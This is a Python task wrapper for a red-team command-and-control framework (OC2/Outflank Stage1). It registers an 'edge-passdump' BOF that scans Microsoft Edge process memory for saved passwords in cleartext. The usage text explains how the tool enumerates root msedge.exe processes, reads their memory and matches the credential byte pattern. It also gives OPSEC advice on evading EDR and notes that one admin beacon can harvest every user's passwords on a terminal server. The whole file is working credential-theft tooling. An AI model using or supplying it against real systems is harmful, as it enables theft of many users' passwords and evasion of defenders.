"""
OC2 BOF Script for edge-passdump

Scans memory of msedge.exe browser processes for plaintext credentials saved
via Microsoft Password Manager / Autofill. The credentials live in cleartext
inside the parent (root) msedge.exe process, so on a terminal server an
administrator can harvest stored credentials for every interactive user from
a single beacon.

Microsoft has stated this is "by design" and will not fix it. The technique
works against Edge 147.0.3912.98 and earlier; newer builds may move or scrub
the buffer.

Argument contract: i  (PID, 0 = enumerate all root msedge processes)
"""

from typing import List, Tuple

from outflank_stage1.task.base_bof_task import BaseBOFTask
from outflank_stage1.task.enums import BOFArgumentEncoding
from outflank_stage1.task.exceptions import TaskInvalidArgumentsException


class EdgePassdumpBOF(BaseBOFTask):
    def __init__(self):
        super().__init__("edge-passdump", base_binary_name="edge-passdump")

        self.parser.description = (
            "Dump plaintext credentials from msedge.exe process memory. "
            "Targets the built-in Microsoft Password Manager / Autofill feature, "
            "which keeps saved passwords in cleartext in the root browser process."
        )

        self.parser.add_argument(
            "--pid",
            "-p",
            type=int,
            default=0,
            help="Scan only this PID (must be a msedge.exe root process). "
                 "0 (default) enumerates and scans all root msedge.exe processes.",
        )

        self.parser.epilog = (
            "Example usage:\n"
            "  edge-passdump                # Enumerate and scan all root msedge.exe processes\n"
            "  edge-passdump --pid 4321     # Scan only PID 4321\n\n"
            "Requirements:\n"
            "  - Administrator / SeDebugPrivilege to read other users' processes\n"
            "  - Edge 147.0.3912.98 or earlier (newer builds may not be vulnerable)\n"
            "  - The target user must have stored credentials via Password Manager\n\n"
            "How it works:\n"
            "  - Toolhelp32 enumerates msedge.exe processes\n"
            "  - Renderer / GPU children (parent is also msedge.exe) are skipped\n"
            "  - Each root process is opened with PROCESS_VM_READ\n"
            "  - Committed PAGE_READWRITE regions are read with ReadProcessMemory\n"
            "  - Bytes are scanned for the credential format Edge keeps in memory:\n"
            "      <letter>http(s) <user 3..20> <pass 6..40> \\0\n"
            "    The URL anchor (3x NUL + URL chars) immediately preceding the\n"
            "    credential is recovered when present.\n\n"
            "Limitations:\n"
            "  - Passwords containing spaces are NOT matched (avoids regex backtracking)\n"
            "  - Username/password length bounds: 3-20 / 6-40 bytes (UTF-8)\n"
            "  - Output is byte-level: non-ASCII chars appear as raw UTF-8 bytes\n\n"
            "OPSEC Considerations:\n"
            "  - Cross-process VM_READ on every msedge.exe parent generates EDR signal\n"
            "  - Plaintext passwords are written to beacon output - secure your channel\n"
            "  - Allocates one heap buffer per process up to the largest committed RW region\n"
            "  - Read-only - no remote process is modified\n\n"
            "Reference:\n"
            "  https://github.com/skesik/EdgeSavedPasswordsDumper\n"
        )

    def validate_arguments(self, arguments: List[str]):
        super().validate_arguments(arguments)
        parser_arguments = self.parser.parse_args(arguments)

        if parser_arguments.pid < 0:
            raise TaskInvalidArgumentsException("--pid must be >= 0")

    def _encode_arguments_bof(
        self, arguments: List[str]
    ) -> List[Tuple[BOFArgumentEncoding, str]]:
        parser_arguments = self.parser.parse_args(arguments)
        return [
            (BOFArgumentEncoding.INT, parser_arguments.pid),
        ]
